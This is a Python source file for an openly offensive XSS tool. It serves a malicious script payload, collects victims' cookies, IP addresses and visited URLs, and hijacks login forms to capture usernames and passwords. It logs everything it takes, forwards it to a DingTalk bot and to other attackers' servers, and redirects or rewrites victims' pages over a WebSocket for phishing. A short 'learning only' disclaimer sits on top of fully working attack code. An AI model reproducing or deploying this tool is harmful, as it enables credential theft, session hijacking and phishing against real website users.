#!/usr/bin/python3
# @Мартин.
import base64,json,socket,hashlib,sys,os,argparse,textwrap,threading,datetime,time,requests,re,struct
from loguru import logger
Version = "@Мартин. XSS Tool V3.6.4"
Title='''
************************************************************************************
<免责声明>:本工具仅供学习实验使用,请勿用于非法用途,否则自行承担相应的法律责任
<Disclaimer>:This tool is only for learning and experiment. Do not use it for illegal purposes, or you will bear corresponding legal responsibilities
************************************************************************************'''
Ding_talk_headers = {'Content-Type': 'application/json;charset=utf-8'}
Logo=f'''
  __       __  _______                               ______    ______   _______  
/  \     /  |/       \                             /      \  /      \ /       \ 
$$  \   /$$ |$$$$$$$  |  ______    ______         /$$$$$$  |/$$$$$$  |$$$$$$$  |
$$$  \ /$$$ |$$ |  $$ | /      \  /      \        $$ | _$$/ $$ | _$$/ $$ |__$$ |
$$$$  /$$$$ |$$ |  $$ |/$$$$$$  |/$$$$$$  |       $$ |/    |$$ |/    |$$    $$< 
$$ $$ $$/$$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |       $$ |$$$$ |$$ |$$$$ |$$$$$$$  |
$$ |$$$/ $$ |$$ |__$$ |$$ \__$$ |$$ \__$$ |       $$ \__$$ |$$ \__$$ |$$ |__$$ |
$$ | $/  $$ |$$    $$/ $$    $$/ $$    $$ | ______$$    $$/ $$    $$/ $$    $$/ 
$$/      $$/ $$$$$$$/   $$$$$$/   $$$$$$$ |/      |$$$$$$/   $$$$$$/  $$$$$$$/  
                                 /  \__$$ |$$$$$$/                              
                                 $$    $$/                      Github==>https://github.com/MartinxMax    
                                  $$$$$$/                       {Version}  
'''

def Init_Loger():
    logger.remove()  # 清除所有默认处理器
    logger.add(
        sink=sys.stdout,
        format="<green>[{time:HH:mm:ss}]</green><level>[{level}]</level> -> <level>{message}</level>",
        level="INFO"
    )

def Get_LoackHost():
    if socket.gethostbyname(socket.gethostname()).startswith('127'):
        return os.popen("ifconfig eth0 | awk -F \"[^0-9.]+\" 'NR==2{print $2}'").read().strip()
    else:
        return socket.gethostbyname(socket.gethostname())

class All_Config():
    def __init__(self,args):
        self.args = args
        self.LPORT = args.LPORT
        self.LHOST = args.LHOST
        self.Transmission_mode = args.Transmission_mode
        self.R_BTCP = args.R_BTCP
        self.Table_hijack = args.Table_Hijack
        self.Table_Username = args.Table_Username
        self.Table_Password = args.Table_Password
        self.Table_ButtonName = args.Table_ButtonName
        self.Redirect_Page = args.Redirect_Page
        self.DingTalk_Config = args.DingTalk_Config_File
        self.DingTalk_Token = args.DingTalk_Token
        self.DingTalk_Key = args.DingTalk_Token
        self.Reverse = args.Reverse
        self.Web_Socket_Port=args.Web_default_Socket_Port
        self.Web_File=args.Web_File


    def run(self):
        Basic_Server(self.args).start()
        time.sleep(0.5)
        if self.Reverse :
            Web_SOCKET_Server(self.Web_Socket_Port,self.LHOST,self.Web_File).run()


class Web_SOCKET_Server():
    def __init__(self,*Pars):
        self.Socket_Default_Port=Pars[0]
        self.Bind_Socket_IP=Pars[1]
        self.Web_File=Pars[2]
        self.Online_People=0
        self.IP_LIST = list()


    def run(self):
        self.Init_Web_Socet_Server()


    def Init_Web_Socet_Server(self):
        self.Server_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Server_SOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.Server_SOCK.bind(('', self.Socket_Default_Port))
        self.Server_SOCK.listen(100)
        logger.info("Web_Socket_Server Online [*]")
        self.Waiting_for_users()


    def Get_101_Server_Args(self, data):
        try:
            Web_Key = re.search(r'Sec-WebSocket-Key:(.*?)\r\n', data).group().split(':')[
                      -1].strip() + '258EAFA5-E914-47DA-95CA-C5AB0DC85B11'
            Web_Key = base64.b64encode(hashlib.sha1(Web_Key.encode('utf-8')).digest()).decode()
            Port = re.search(r'Host:(.*?)\r\n', data).group().split(':')[-1].strip()
            IP = re.search(r'Host:(.*?)\r\n', data).group().split(':')[-2].strip()
        except Exception as e:
            return (False,False,False)
        else:
            return (Web_Key, IP, Port)


    def send_Web_msg(self,conn,msg_bytes):
        first_byte = b"\x81"
        length = len(msg_bytes)
        if length < 126:
            first_byte += struct.pack("B", length)
        elif length <= 0xFFFF:
            first_byte += struct.pack("!BH", 126, length)
        else:
            first_byte += struct.pack("!BQ", 127, length)
        msg = first_byte + msg_bytes
        conn.sendall(msg)
        return True


    def get_data(self, info):
        payload_len = info[1] & 127
        if payload_len == 126:
            extend_payload_len = info[2:4]
            mask = info[4:8]
            decoded = info[8:]
        elif payload_len == 127:
            extend_payload_len = info[2:10]
            mask = info[10:14]
            decoded = info[14:]
        else:
            extend_payload_len = None
            mask = info[2:6]
            decoded = info[6:]
        bytes_list = bytearray() 
        for i in range(len(decoded)):
            chunk = decoded[i] ^ mask[i % 4]  
            bytes_list.append(chunk)
        body = str(bytes_list, encoding='utf-8')
        return body
    

    def Waiting_for_users(self):
        while True:
            try:
                Client_Socket, User_INFO = self.Server_SOCK.accept()
            except Exception as e:
                continue
            else:
                threading.Thread(target=self.Build_Web_Socket, args=(Client_Socket, User_INFO)).start()


    def Build_Web_Socket(self, Client_Socket, User):
        try:
            C_Data = Client_Socket.recv(8096).decode()
        except Exception as e:
            Client_Socket.close()
        else:

            Web_Key, IP, Port = self.Get_101_Server_Args(C_Data)
            if Web_Key:
                response_tpl = "HTTP/1.1 101 Switching Protocols\r\n" \
                            "Upgrade:websocket\r\n" \
                            "Connection: Upgrade\r\n" \
                            f"Sec-WebSocket-Accept: {Web_Key}\r\n" \
                            f"WebSocket-Location: ws://{IP}:{Port}\r\n\r\n"
                Client_Socket.send(response_tpl.encode('utf-8'))
                Data = None
                while True:
                    try:
                        Data = self.get_data(Client_Socket.recv(8096))
                    except Exception as e:
                        Client_Socket.close()
                        if self.Online_People>0:
                            self.Online_People-=1
                        logger.warning(f"IP:{Data}------[Web_Offline<{self.Online_People}>]")
                        break
                    else:
                        if Data:
                            self.Online_People+=1
                            logger.info(f"IP:{Data}------[Web_Online<{self.Online_People}>]")
                            with open(self.Web_File, 'r', encoding='utf-8') as f:
                                Web_Code = f.read().replace("\n", "").replace('\"', '\'')
                            self.send_Web_msg(Client_Socket, Web_Code.encode('utf-8'))
                        else:
                            logger.error("Error Data")

class Basic_Server(threading.Thread):
    def __init__(self,args=None):
        threading.Thread.__init__(self, args=args)
        self.Basic_IP=args.LHOST
        self.Basic_Port = args.LPORT
        self.Transmission_mode = args.Transmission_mode
        self.DingTalk_Token=args.DingTalk_Token
        self.DingTalk_Key = args.DingTalk_Key
        self.DingTalk_Config_File=args.DingTalk_Config_File
        self.R_BTCP=args.R_BTCP
        self.R_WTCP=args.R_WTCP
        self.Web_default_Socket_Port=args.Web_default_Socket_Port
        self.Reverse=args.Reverse
        self.Table_hijack=args.Table_Hijack
        self.Push_API=args.PUSH_API
        self.Redirect_Page=args.Redirect_Page
        self.Web_File=args.Web_File
        self.Table_hijack = args.Table_Hijack
        self.Table_Username = args.Table_Username
        self.Table_Password = args.Table_Password
        self.Table_ButtonName = args.Table_ButtonName

        self.R_BTCP_NAME=base64.b64encode((self.Transmission_mode and self.R_BTCP or 'http://' +self.Basic_IP+ ':'+str(self.Basic_Port)).encode('utf-8')).decode('utf-8')
        self.R_WTCP_NAME=base64.b64encode((self.Transmission_mode and self.R_WTCP or 'http://' + self.Basic_IP + ':' + str(self.Web_default_Socket_Port)).encode('utf-8')).decode('utf-8')


    def run(self):
        self.Init_Basic_Server()


    def Init_Basic_Server(self):
        self.Basic_SOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.Basic_SOCK.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.Basic_SOCK.bind(('', self.Basic_Port))
        self.Basic_SOCK.listen(100)
        self.Show_PAYLOAD()
        self.Basic_Waitting_for_user()


    def Show_PAYLOAD(self):
        logger.info(f"[Payload] <script src=\"{base64.b64decode(self.R_BTCP_NAME.encode('utf-8')).decode('utf-8')}/Main.js\"></script>")
        if self.Reverse:
            logger.info(f"[WebSocket] {base64.b64decode(self.R_WTCP_NAME.encode('utf-8')).decode('utf-8')}")
        if self.Table_hijack:
            logger.info(f"[My Index Web] {base64.b64decode(self.R_BTCP_NAME.encode('utf-8')).decode('utf-8')}")
        if self.Push_API:
            logger.info(f"[PUSH Other Host Interface(PUSH_POST_Json)] {self.Push_API}")
        if self.DingTalk_Config_File :
            self.Get_DingTalk_Config_File()
            logger.info(f"[Push To DingTalk] Token:{self.DingTalk_Token} Key:{self.DingTalk_Key}")
        elif self.DingTalk_Key and self.DingTalk_Token:
            logger.info(f"[Push To DingTalk] Token:{self.DingTalk_Token} Key:{self.DingTalk_Key}")
        logger.info(f"[Get Other Host Data (Get_POST_Json)] {base64.b64decode(self.R_BTCP_NAME.encode('utf-8')).decode('utf-8')}/DATA")


    def Basic_Waitting_for_user(self):
        while True:
                try:
                    Client_Socket, User_INFO = self.Basic_SOCK.accept()
                except Exception as e:
                    continue
                else:
                    threading.Thread(
                        target=self.Service_user, args=(Client_Socket,)
                    ).start()


    def Service_user(self,Client_Socket):
        try:
            DATA = Client_Socket.recv(1024).decode('utf-8')
        except Exception as e:
            self.Basic_SOCK.close()
            return False
        else:
            Stat_code = self.Judgment_type(DATA)
            if Stat_code==0:
                logger.info("<Main.js> Accessed")
                JS_File_Code = self.Handle_JS_Script_message()
                Client_Socket.send(JS_File_Code)
            elif Stat_code == 1:
                self.Get_User_Information_And_Display(DATA)
            elif Stat_code == 2:
                logger.info("<Index.html> Accessed")
                Index_Page = self.Send_Index_page()
                Client_Socket.send(Index_Page)
            elif Stat_code == 3:
                logger.info("Hacker Share Data For you")
                self.Get_User_Information_And_Display(DATA,Flag=True)
            elif Stat_code == 4:
                if self.Web_File:
                    logger.info("<Web.js> Accessed")
                    Client_Socket.send(self.Send_Web_JS())
            elif Stat_code ==5:
                logger.warning("Get Password")
                self.Get_Passwod(DATA)
            Client_Socket.close()

    def Save_Log(self,FileName,Data):
        with open(FileName,'a+',encoding='utf-8')as f:
            f.write(Data+"\n")


    def Get_Passwod(self,Data):
        User_INFO = json.loads(re.search(r'{(.*?)}', Data).group())
        for Key, Value in User_INFO.items():
            User_INFO[Key] = self.Decrypt(Value)
        DisPlat=f"From_URL:{User_INFO['Vis_URL']} Time:{User_INFO['Time']}\nUserName:{User_INFO['U1']} Password:{User_INFO['P1']}"
        logger.warning(DisPlat)
        self.Save_Log("Username_Password_information.log", DisPlat)
        if self.DingTalk_Key and self.DingTalk_Token:
            logger.warning("Username and Password Push The DingTalk Success!")
            self.DingTalk_Send(DisPlat)


    def Send_Web_JS(self):
        with open('./Web.js', 'r', encoding='utf-8') as f:
            Web = f.read()
        if self.Reverse:
            WebSocket=self.Transmission_mode and (base64.b64decode(self.R_WTCP).decode('utf-8').split('//')[-1] if 'http' in base64.b64decode(self.R_WTCP).decode('utf-8') else False) or self.Basic_IP+ ':'+str(self.Web_default_Socket_Port)

            Web = Web.replace("@IP_PORT",
                              base64.b64encode(WebSocket.encode('utf-8')).decode('utf-8'),1)

        Web = Web.replace("@HOST",self.R_BTCP_NAME,1)
        Web = Web.replace("@User_Name_key", self.Table_Username, 1)
        Web = Web.replace("@Password_Key", self.Table_Password, 1)
        Web = Web.replace("@Button", self.Table_ButtonName, 1)
        Head = "HTTP/1.1 200 OK\r\n"
        Head += f"content-length:{len(Web)}\r\n\r\n" + Web
        return Head.encode('utf-8')


    def Push_Data_Other_Hacker(self,Data):
        try:
            requests.post(self.Push_API,data=Data,timeout=1)
        except:
            pass
        finally:
            logger.warning("Share Other Hacker Success")

    def Get_User_Information_And_Display(self, DATA,Flag=False):
        User_INFO = json.loads(re.search(r'{(.*?)}', DATA).group())
        if self.Push_API:
            self.Push_Data_Other_Hacker(re.search(r'{(.*?)}', DATA).group())
        for Key, Value in User_INFO.items():
            User_INFO[Key] = self.Decrypt(Value)
        Dis_Info=f"IP:{User_INFO['IP']} Host_Type:{User_INFO['Host_Type']} Visit_URL:{User_INFO['Visit_URL']}\nCookie:{User_INFO['Cookies']} NetWork:{User_INFO['NetWork']}"
        logger.warning(Dis_Info)
        if not Flag:
            self.Save_Log("Basic_information.log", Dis_Info)
            if self.Redirect_Page:
                logger.warning(f"{User_INFO['IP']} Redirect To >>> {self.Redirect_Page}")
                self.Save_Log("Redirect_information.log", f"{User_INFO['IP']} Redirect To >>> {self.Redirect_Page}")
            if self.DingTalk_Token and self.DingTalk_Key :
                self.DingTalk_Send(Dis_Info+Version)
        else:
            self.Save_Log("Other_Hacker_Data_information.log", Dis_Info)

    def Handle_JS_Script_message(self):
        Head = "HTTP/1.1 200 OK\r\n"
        with open('./Main.js', 'r',encoding='utf-8') as f:
            Note = f.read()
        Note = Note.replace("@IPCONFIG",
                            self.R_BTCP_NAME,1)
        if self.Web_File:
            Note=Note.replace('@Web',"True",1)
        if self.Table_hijack and self.Table_Username and self.Table_Password and self.Table_ButtonName:
            Note = Note.replace("@Button",self.Table_ButtonName,1)
            Note = Note.replace("@User_Name_key", self.Table_Username,1)
            Note = Note.replace("@Password_Key", self.Table_Password,1)
        if self.Redirect_Page:
            Note = Note.replace("@Rd_Path",
                                          f"window.location.href=\"{self.Redirect_Page}\"",1)
        else:
            Note = Note.replace("@IP_PORT",'Null',1)

        Head += f"content-length:{len(Note)}\r\n\r\n"+Note
        return Head.encode('utf-8')


    def Judgment_type(self, DATA):
        if "GET /Main.js" in DATA:
            return 0
        elif "GET /Web.js" in DATA:
            return 4
        elif "POST /DATA" in DATA:
            return 3
        elif "POST /PASSWORD" in DATA:
            return 5
        elif "{" in DATA and "/JSONDATA" in DATA:
            return 1

        else:
            return 2


    def Send_Index_page(self):
        with open('./index.html','r',encoding='utf-8')as f:
            Code = f.read()
        Head = "HTTP/1.1 200 OK\r\n"
        Head += f"content-length:{len(Code)}\r\n\r\n"+Code
        return Head.encode('utf-8')


    def Decrypt(self,str):
        try:
            str=base64.b64decode(str).decode("utf-8")
        except:
            pass
        return str


    def DingTalk_Send(self,Push_Message):
        DATA=None
        Message = {
            "text": {
                "content": f"=={self.DingTalk_Key}==\n{Push_Message}"
            },
            "msgtype": "text"
        }
        try:
            DATA = requests.post(f"https://oapi.dingtalk.com/robot/send?access_token={self.DingTalk_Token}",
                         headers=Ding_talk_headers
                         , json=Message)
        except:
            pass
        finally:
            if DATA.status_code == 200:
                logger.info("Message Push DingTalk ------[Success]")
                return True
            else:
                logger.error("Message Push DingTalk ------[Fail]")
                return False


    def Get_DingTalk_Config_File(self):
        try:
            with open('DingTalk.conf','r')as f:
                Note = json.loads(f.read())
        except:
            return False
        else:
            if Note['Token'] and Note['Key_Word']:
                self.DingTalk_Token=Note['Token']
                self.DingTalk_Key=Note['Key_Word']
                return True
            else:
                return False


def main():
    print(Logo,"\n",Title)
    Init_Loger()
    parser = argparse.ArgumentParser(
        formatter_class=argparse.RawTextHelpFormatter,
        epilog=textwrap.dedent('''
        Example:
            author-Github==>https://github.com/MartinxMax
            python3 {PY_F} -t -rbtcp http(s)://(Ngrok TCP Tunnel)  -rwtcp http(s)://(Ngrok TCP Tunnel) -rs -wf fs.html -table -button BT -user UA -pass PA 
            #^Remote page hijacking(There is no need to add the - rbtcp and - rwtcp parameters in the LAN)
        Basic usage:
            python3 {PY_F} -lh 192.168.1.8 #Set local IP
            python3 {PY_F} -lp 9999 #Set local listening port
            python3 {PY_F} #Direct operation(Default port 8888，Do not enable hijacking module) 
            python3 {PY_F} -rs -wsp 8889 #Set the Websocket port (use the - rs parameter with the hijacking module)
            python3 {PY_F} -dcf #Use the contents in the configuration file to push the results to DingTalk
            python3 {PY_F} -dt (DingTalk_Token) -dk (DingTalk_Keywords) #Fill in Token and keywords directly for Dingtalk push
            python3 {PY_F} -rd (URL)  #Redirect all users accessing this page to the specified page
            python3 {PY_F} -pu http(s)://(Target):(Object local port)/DATA # Share data results with other hackers
            python3 {PY_F} -rs -wf (Local html file) -table -button (button Tag id) -user (username Tag id) -pass (password Tag id) 
            #^Remote host page hijacking for phishing
            python3 {PY_F} -t -rbtcp http(s)://(Ngrok TCP Tunnel) #Penetration for basic services
            python3 {PY_F} -t -rwtcp http(s)://(Ngrok TCP Tunnel) #Penetration for Websocket services
            '''.format(PY_F = sys.argv[0]
                )))
    parser.add_argument('-lp', '--LPORT', type=int, default=8888, help='Listen port')
    parser.add_argument('-lh', '--LHOST', default=Get_LoackHost(), help='Currently in the development stage, you don\'t need to carry this parameter')
    parser.add_argument('-t', '--Transmission_mode', action='store_true', help='Intranet penetration mode')
    parser.add_argument('-rbtcp', '--R_BTCP', default=Get_LoackHost(), help='Remote Basic_Server')
    parser.add_argument('-rwtcp', '--R_WTCP', default=Get_LoackHost(), help='Remote Web_SOCKET_Server')
    parser.add_argument('-dcf', '--DingTalk_Config_File', action='store_true', help='DingTalk_Config_File')
    parser.add_argument('-dt','--DingTalk_Token', default=None, help='DingTalk_Token')
    parser.add_argument('-dk','--DingTalk_Key', default=None, help='DingTalk_Key')
    parser.add_argument('-rd', '--Redirect_Page', default=None, help='Redirect_Page')
    parser.add_argument('-table', '--Table_Hijack', action='store_true', help='Table_hijack')
    parser.add_argument('-button', '--Table_ButtonName', default=None, help='Table_ButtonName')
    parser.add_argument('-user', '--Table_Username', default=None, help='Table_Username')
    parser.add_argument('-pass', '--Table_Password', default=None, help='Table_Password')
    parser.add_argument('-rs', '--Reverse', action='store_true', help='Reverse connect host')
    parser.add_argument('-pu', '--PUSH_API',default=None, help='Push API')
    parser.add_argument('-wsp', '--Web_default_Socket_Port',type=int,default=8889, help='Push API')
    parser.add_argument('-wf', '--Web_File',default=None, help='Chang WebPage Code')
    args = parser.parse_args()
    All_Config(args).run()


if __name__ == '__main__':
    main()